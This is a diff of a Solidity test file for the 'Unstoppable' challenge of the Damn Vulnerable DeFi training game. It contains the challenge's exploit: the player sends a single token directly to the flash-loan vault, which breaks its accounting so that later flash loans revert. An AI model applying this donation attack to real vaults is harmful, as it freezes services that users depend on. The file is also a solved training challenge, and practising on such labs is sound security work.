@@ -11,39 +11,35 @@ contract UnstoppableVaultTest is Test {
     UnstoppableVault public vault;
     DamnValuableToken public token;
     address poolOwner = makeAddr("poolOwner");
-    address feeReceiver = makeAddr("feeReceiver");
-    address receiverOwner = makeAddr("receiverOwner");
+    address player = makeAddr("player");
     uint256 public constant ATTACKER_INITIAL_BALANCE = 10e18;
     uint256 public constant POOL_INITIAL_BALANCE = 100_000_000e18;
 
     function setUp() public {
         token = new DamnValuableToken();
-        token.transfer(receiverOwner, ATTACKER_INITIAL_BALANCE);
-        vault = new UnstoppableVault(token, poolOwner, feeReceiver);
+        token.transfer(player, ATTACKER_INITIAL_BALANCE);
+        vault = new UnstoppableVault(token, poolOwner, poolOwner);
 
-        assertEq(token.balanceOf(receiverOwner), ATTACKER_INITIAL_BALANCE);
+        assertEq(token.balanceOf(player), ATTACKER_INITIAL_BALANCE);
 
         token.approve(address(vault), POOL_INITIAL_BALANCE);
         vault.deposit(POOL_INITIAL_BALANCE, address(vault));
 
         assertEq(token.balanceOf(address(vault)), POOL_INITIAL_BALANCE);
 
-        vm.startPrank(receiverOwner);
         receiver = new ReceiverUnstoppable(address(vault));
-        vm.stopPrank();
+        validate();
     }
 
     function testAttackAndValidate() public {
-        vm.startPrank(receiverOwner);
-        token.transfer(address(vault), 10e18);
+        vm.startPrank(player);
+        token.transfer(address(vault), 1);
         vm.stopPrank();
         vm.expectRevert();
         validate();
     }
 
     function validate() public {
-        vm.startPrank(receiverOwner);
-        receiver.executeFlashLoan(1_000_000e18);
-        vm.stopPrank();
+        receiver.executeFlashLoan(1000e18);
     }
 }
